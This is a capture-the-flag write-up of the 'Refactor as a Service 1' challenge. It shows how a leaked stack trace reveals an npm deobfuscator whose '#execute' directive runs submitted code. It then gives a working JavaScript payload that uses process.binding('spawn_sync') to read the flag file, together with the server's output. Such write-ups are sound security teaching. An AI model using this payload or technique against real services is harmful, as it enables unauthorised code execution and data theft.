# Refactor as a Service 1

## tl;dr
- Error-based information disclosure of a used npm package
- Visit the npm package page to find `#execute` gadget to execute arbitrary code

## Flag

```
L3AK{th4t_w4s_1nd33d_s0m3_fl4wl3ss_e3x3cu710n}
```

## Detailed Solution

No source code for this challenge! All we are given is a nc command to connect to a server. The challenge description and name suggests that the service will some how transform our input. Let's connect to the server and see what it does.

### Initial testing

```
steak@L3AKCTF:~$ nc 193.148.168.30 6670

/$$$$$$$                       /$$$$$$
| $$__  $$                     /$$__  $$
| $$  \ $$  /$$$$$$   /$$$$$$ | $$  \__/
| $$$$$$$/ |____  $$ |____  $$|  $$$$$$
| $$__  $$  /$$$$$$$  /$$$$$$$ \____  $$
| $$  \ $$ /$$__  $$ /$$__  $$ /$$  \ $$
| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/
|__/  |__/ \_______/ \_______/ \______/

Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
```

We can input some simple code to test out the functionality. Let's trying encoding `console.log(1+1)` in base64 and sending it to the server.

The server replies with the following:

```
Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
Y29uc29sZS5sb2coMSsxKQ==
Refactored Code:
console.log(2);

Goodbye!
```

It seems that the expression inside the `console.log` statement has been evaluated. However, it is still unclear whether this is the result of some kind of static evaluation or dynamic execution. However, we do note that the `console.log` was not evaluated since the server did not print `2` to the console.

### Error-based information disclosure


Further testing reveals that there is no naive way to execute arbitrary code. One thing that would help immensely is to be able to see the source code. Let's try inputting some random that when base64 decoded, should decode to gibberish:

```
steak@L3AKCTF:~$ nc 193.148.168.30 6670

/$$$$$$$                       /$$$$$$
| $$__  $$                     /$$__  $$
| $$  \ $$  /$$$$$$   /$$$$$$ | $$  \__/
| $$$$$$$/ |____  $$ |____  $$|  $$$$$$
| $$__  $$  /$$$$$$$  /$$$$$$$ \____  $$
| $$  \ $$ /$$__  $$ /$$__  $$ /$$  \ $$
| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/
|__/  |__/ \_______/ \_______/ \______/

Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
zz
Error during refactoring Error: [1:1]: Unexpected "�"
    at new JsError (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:166:104)
    at GenericParser.createError (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:297:14)
    at GenericParser.createILLEGAL (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:256:53)
    at GenericParser.advance (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:1542:20)
    at GenericParser.parseScript (/home/ctfuser/app/node_modules/shift-parser/dist/parser.js:276:29)
    at parse (/home/ctfuser/app/node_modules/shift-parser/dist/index.js:172:43)
    at deobfuscate (/home/ctfuser/app/node_modules/not-a-real-refactoring-tool/dist/index.js:44:44)
    at Refactorer.refactorCode (file:///home/ctfuser/app/index.js:53:16)
    at Refactorer.handleInput (file:///home/ctfuser/app/index.js:38:41)
    at Interface.emit (node:events:519:28) {
  index: 0,
  line: 1,
  column: 1,
  parseErrorLine: 1,
  parseErrorColumn: 1,
  description: 'Unexpected "�"'
}
Goodbye!
```

This triggers an error, with the stack trace disclosing a lot of useful information. We can deduce a few things from this:

1. The server uses a `Refactorer` class to parse and refactor the code.
2. Internally, the `refactorCode` function calls the `deobfuscate` function from the `not-a-real-refactoring-tool` package.
3. The `deobfuscate` function makes use of the `shift-parser` package to parse the code.

Out of these, the node module `not-a-real-refactoring-tool` stands out the most. Searching this on npm, we find that it is indeed a real package: [not-a-real-factoring-tool - npm](https://www.npmjs.com/package/not-a-real-refactoring-tool)

### Investigating the `not-a-real-refactoring-tool` package

Scanning through the package's README, we find a section titled "Function Evaluation" under "Advanced Usage": 

``````
## Advanced Usage

### Function Evaluation

Often obfuscated scripts don't just use an array of strings, instead they have string decoder functions that execute more complex logic, such as the example below.

```javascript
function _0x29e92(_0x337a9) {
    const _0x38a2db = ['\x48\x65\x6c\x6c\x6f', '\x20', '\x57\x6f\x72\x6c\x64'];
    const _0x9ca21 = _0x337a9 - 0x1;
    const _0xa8291 = _0x38a2db[_0x9ca21];
    return _0xa8291;
}

const _0x78e2 = _0x29e92(1) + _0x29e92(2) + _0x29e92(3);
console.log(_0x78e2);
```

To tell the refactorer to execute this function, you can use the "#execute" directive like so:

```javascript
function _0x29e92(_0x337a9) {
    '#execute';
    const _0x38a2db = ['\x48\x65\x6c\x6c\x6f', '\x20', '\x57\x6f\x72\x6c\x64'];
    const _0x9ca21 = _0x337a9 - 0x1;
    const _0xa8291 = _0x38a2db[_0x9ca21];
    return _0xa8291;
}

const _0x78e2 = _0x29e92(1) + _0x29e92(2) + _0x29e92(3);
console.log(_0x78e2);
```

The refactorer will then evaluate this function and attempt to replace any calls to it with the correct values:

```javascript
const a = 'Hello World';
console.log(a);
```

A few important points about function evaluation:

-   BE CAREFUL when using function evaluation, this executes whatever functions you specify on your local machine so make sure those functions are not doing anything malicious.
-   This feature is still somewhat experimental, it's probably easier to use via the CLI as it's easier to find errors than the online version.
-   If the function is not a function declaration (i.e. a function expression or an arrow function expression) then the refactorer will not be able to detect the name of it automatically. To provide it use "#execute[name=FUNC_NAME]" directive.
-   You may need to modify the function to ensure it relies on no external variables (i.e. move a string array declaration inside the function) and handle any extra logic like string array rotation first.
-   You must first remove any anti tampering mechanisms before using function evaluation, otherwise it may cause an infinite loop.
``````

Looks like we can make use of the `'#execute'` directive to execute arbitrary code through a function! We can leverage this to list directories, read files, or spawn a shell.

### The exploit

Below is a function to cat out the flag file:

```js
function a() {
    '#execute'
    let result = process.binding("spawn_sync").spawn({ file: "cat", args: ["cat", "./flag"], stdio: [{ type: "pipe", readable: true, writable: false }, { type: "pipe", readable: false, writable: true }, { type: "pipe", readable: false, writable: true },], }); let output = result.output[1].toString(); console.log(output)
}
a();
```

Encoding this in base64 and sending it to the server gives us the flag:

```
steak@L3AKCTF:~$ nc 193.148.168.30 6670

/$$$$$$$                       /$$$$$$
| $$__  $$                     /$$__  $$
| $$  \ $$  /$$$$$$   /$$$$$$ | $$  \__/
| $$$$$$$/ |____  $$ |____  $$|  $$$$$$
| $$__  $$  /$$$$$$$  /$$$$$$$ \____  $$
| $$  \ $$ /$$__  $$ /$$__  $$ /$$  \ $$
| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/
|__/  |__/ \_______/ \_______/ \______/

Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
ZnVuY3Rpb24gYSgpIHsNCiAgICAnI2V4ZWN1dGUnDQogICAgbGV0IHJlc3VsdCA9IHByb2Nlc3MuYmluZGluZygic3Bhd25fc3luYyIpLnNwYXduKHsgZmlsZTogImNhdCIsIGFyZ3M6IFsiY2F0IiwgIi4vZmxhZyJdLCBzdGRpbzogW3sgdHlwZTogInBpcGUiLCByZWFkYWJsZTogdHJ1ZSwgd3JpdGFibGU6IGZhbHNlIH0sIHsgdHlwZTogInBpcGUiLCByZWFkYWJsZTogZmFsc2UsIHdyaXRhYmxlOiB0cnVlIH0sIHsgdHlwZTogInBpcGUiLCByZWFkYWJsZTogZmFsc2UsIHdyaXRhYmxlOiB0cnVlIH0sXSwgfSk7IGxldCBvdXRwdXQgPSByZXN1bHQub3V0cHV0WzFdLnRvU3RyaW5nKCk7IGNvbnNvbGUubG9nKG91dHB1dCkNCn0NCmEoKTs=
L3AK{th4t_w4s_1nd33d_s0m3_fl4wl3ss_e3x3cu710n}

Refactored Code:
function a() {
  "#execute";
  let result = process.binding("spawn_sync").spawn({file: "cat", args: ["cat", "./flag"], stdio: [{type: "pipe", readable: true, writable: false}, {type: "pipe", readable: false, writable: true}, {type: "pipe", readable: false, writable: true}]});
  let output = result.output[1].toString();
  console.log(output);
}
a();

Goodbye!
```